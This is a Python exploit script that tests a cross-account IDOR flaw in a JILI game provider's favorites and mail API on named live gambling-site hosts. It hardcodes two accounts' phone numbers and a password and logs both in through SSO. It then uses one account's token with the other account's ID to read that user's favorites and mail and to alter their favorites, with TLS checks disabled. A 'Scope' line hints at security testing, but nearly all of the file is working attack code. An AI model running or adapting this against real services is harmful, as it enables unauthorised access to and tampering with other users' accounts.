#!/usr/bin/env python3 -I
"""probe_f128_jili_idor.py — JILI favoriteservice cross-account IDOR (F128)

Chain:
  1. Auth vak88z2 Account A (0972571110) + B (0811111111)
  2. enter-game → ssoKey per account
  3. sso-login.api → {accountId, token} per account
  4. GET favoriteservice/OnLogin?accountId=B&token=A → expect B's data
  5. GET favoriteservice/GetFavoriteList?accountId=B&token=A → expect B's favorites
  6. GET mail/GetMailList?accountId=B&token=A
  7. POST favoriteservice/SetFavorite (write-IDOR) — accountId=B, token=A

Scope: wbwebapi.royalflush888.com, wbslot-fd.royalflush888.com, ifgtameh.site
"""
import json, requests, base64, time, sys, pathlib, re
requests.packages.urllib3.disable_warnings()

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
ORIGIN = "https://www.vak88z2.com"

ACCOUNTS = {
    "A": {"phone": "0972571110", "password": "Pwned2026!", "jwt_file": ".jwt.vak88z2_0972", "aid": 4111347982},
    "B": {"phone": "0811111111", "password": "Pwned2026!", "jwt_file": ".jwt.vak88z2_0811", "aid": 4109691669},
}

# Known JILI provider game_list_id on vak88z2
JILI_GAME_LIST_ID = "5048a0a5-deba-4453-8d04-31e3293bf2e7"

# JILI game API hosts (try both)
WBWEBAPI_HOSTS = [
    "wbwebapi.royalflush888.com",
    "wbwebapi.ifgtameh.site",
]

S = requests.Session()
S.verify = False
S.headers.update({"Content-Type": "application/json"})

def bootstrap_awsalb() -> str:
    """Hit the login page to get an AWSALB sticky-session cookie."""
    fp = pathlib.Path(".awsalb")
    cached = fp.read_text().strip() if fp.exists() else ""
    if cached:
        print(f"  [AWSALB] cached ({cached[:20]}…)")
        return cached
    try:
        r = requests.get(f"{ORIGIN}/th/login",
            headers={"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7)"},
            verify=False, timeout=10, allow_redirects=True)
        val = re.search(r'AWSALB=([^;]+)', r.headers.get("Set-Cookie", ""))
        val = val.group(1) if val else ""
        if val:
            fp.write_text(val + "\n")
            print(f"  [AWSALB] bootstrapped ({val[:20]}…)")
        return val
    except Exception as e:
        print(f"  [AWSALB] bootstrap failed: {e}")
        return ""

def get_jwt(acct: dict) -> str:
    fp = pathlib.Path(acct["jwt_file"])
    if fp.exists():
        raw = fp.read_text().strip()
        try:
            pl = json.loads(base64.urlsafe_b64decode(raw.split('.')[1] + '=='))
            if pl.get('exp', 0) - time.time() > 120:
                print(f"  [JWT] cached {acct['phone']}")
                return raw
        except Exception:
            pass
    r = S.post(f"{PBAPI}/pb/authentication",
               json={"strategy": "local", "username": acct["phone"], "password": acct["password"]},
               timeout=15)
    print(f"  auth {acct['phone']}: {r.status_code}")
    if not r.ok:
        print(f"  [ERR] {r.text[:200]}")
        return ""
    token = r.json().get("accessToken", "")
    fp.write_text(token + "\n")
    return token

def get_jili_sso_token(jwt: str, phone: str) -> dict:
    """enter-game → ssoKey → sso-login.api → {accountId, token}"""
    # Enter game
    r = S.post(f"{MGAPI}/mb/enter-game",
               json={"game_list_id": JILI_GAME_LIST_ID, "languageCode": "th"},
               headers={"Authorization": f"Bearer {jwt}"},
               timeout=15, allow_redirects=False)
    print(f"  enter-game {phone}: {r.status_code}")
    game_url = ""
    if r.ok:
        body = r.json()
        game_url = (body.get("game_url") or body.get("url")
                    or body.get("result", {}).get("url", "")
                    or body.get("data", {}).get("game_url", ""))
    else:
        print(f"  [enter-game err] {r.text[:200]}")
        return {}

    # ssoKey is the URL fragment (the part after #)
    sso_key = ""
    if "#" in game_url:
        sso_key = game_url.split("#", 1)[1]
    elif "ssoKey=" in game_url:
        m = re.search(r'ssoKey=([^&]+)', game_url)
        sso_key = m.group(1) if m else ""
    if not sso_key:
        print(f"  [ERR] no ssoKey in game_url: {game_url[:100]}")
        return {}
    print(f"  ssoKey: {sso_key[:20]}...")

    # Exchange ssoKey for JILI token via sso-login.api
    r2 = S.post("https://wbslot-fd.royalflush888.com/sso-login.api",
                json={"ssoKey": sso_key}, timeout=15)
    print(f"  sso-login.api: {r2.status_code}")
    if not r2.ok:
        print(f"  [ERR] {r2.text[:200]}")
        return {}
    data = r2.json()
    inner = data.get("data") or data
    return {
        "accountId": inner.get("accountId"),
        "token": inner.get("token") or inner.get("jiliToken"),
        "ssoKey": sso_key,
    }

def probe_favoriteservice(token_a: str, aid_b: int) -> None:
    endpoints = [
        f"/favoriteservice/OnLogin?accountId={aid_b}&token={token_a}",
        f"/favoriteservice/GetFavoriteList?accountId={aid_b}&token={token_a}",
        f"/mail/GetMailList?accountId={aid_b}&token={token_a}",
    ]
    for host in WBWEBAPI_HOSTS:
        print(f"\n=== wbwebapi host: {host} ===")
        for ep in endpoints:
            url = f"https://{host}{ep}"
            try:
                r = S.get(url, timeout=10)
                print(f"  GET {ep[:60]}")
                print(f"    → {r.status_code}: {r.text[:200]}")
            except Exception as e:
                print(f"  GET {ep[:60]} → ERR: {e}")

def probe_setfavorite_write_idor(token_a: str, aid_a: int, aid_b: int) -> None:
    """Write-IDOR: add a game to Account B's favorites using Account A's token"""
    # Test game_id to add (cc3x5 = 702 is a known JILI game)
    payloads = [
        {"accountId": aid_b, "token": token_a, "gameId": 702, "status": 1},
        {"accountId": aid_b, "token": token_a, "gameId": "702", "action": "add"},
    ]
    for host in WBWEBAPI_HOSTS:
        for pl in payloads:
            url = f"https://{host}/favoriteservice/SetFavorite"
            try:
                r = S.post(url, json=pl, timeout=10)
                print(f"  POST SetFavorite aid={aid_b} token=A @ {host}")
                print(f"    body: {pl}")
                print(f"    → {r.status_code}: {r.text[:300]}")
            except Exception as e:
                print(f"  POST SetFavorite → ERR: {e}")

# ── Main ──────────────────────────────────────────────────────────────────────
print("=== F128 JILI favoriteservice IDOR probe ===\n")

# Step 0: Bootstrap AWSALB
print("--- Bootstrap ---")
awsalb = bootstrap_awsalb()
if awsalb:
    S.cookies.set("AWSALB", awsalb, domain="asdgapicenterssdo.com")
    S.cookies.set("AWSALBCORS", awsalb, domain="asdgapicenterssdo.com")

# Step 1: Get JWTs
print("--- Auth ---")
jwt_a = get_jwt(ACCOUNTS["A"])
jwt_b = get_jwt(ACCOUNTS["B"])
if not jwt_a or not jwt_b:
    print("[FATAL] auth failed")
    sys.exit(1)

# Step 2: Get JILI tokens
print("\n--- JILI token: Account A ---")
info_a = get_jili_sso_token(jwt_a, ACCOUNTS["A"]["phone"])
print(f"  Account A: aid={info_a.get('accountId')}, token={str(info_a.get('token'))[:20]}...")

print("\n--- JILI token: Account B ---")
info_b = get_jili_sso_token(jwt_b, ACCOUNTS["B"]["phone"])
print(f"  Account B: aid={info_b.get('accountId')}, token={str(info_b.get('token'))[:20]}...")

if not info_a.get("token") or not info_b.get("token"):
    print("[FATAL] could not get JILI tokens")
    sys.exit(1)

aid_a = info_a["accountId"] or ACCOUNTS["A"]["aid"]
aid_b = info_b["accountId"] or ACCOUNTS["B"]["aid"]
token_a = info_a["token"]
token_b = info_b["token"]

print(f"\n[*] Account A: aid={aid_a}")
print(f"[*] Account B: aid={aid_b}")

# Step 3: Cross-account read IDOR
print("\n--- Read IDOR: A token + B accountId ---")
probe_favoriteservice(token_a, aid_b)

# Step 4: Write IDOR
print("\n--- Write IDOR: SetFavorite with A token + B accountId ---")
probe_setfavorite_write_idor(token_a, aid_a, aid_b)

# Step 5: Verify write impact — get B's favorites with B's own token
print("\n--- Verify: GetFavoriteList with B token (expected target's own data) ---")
for host in WBWEBAPI_HOSTS:
    url = f"https://{host}/favoriteservice/GetFavoriteList?accountId={aid_b}&token={token_b}"
    try:
        r = S.get(url, timeout=10)
        print(f"  B-native GetFavoriteList @ {host}: {r.status_code}: {r.text[:300]}")
    except Exception as e:
        print(f"  ERR: {e}")
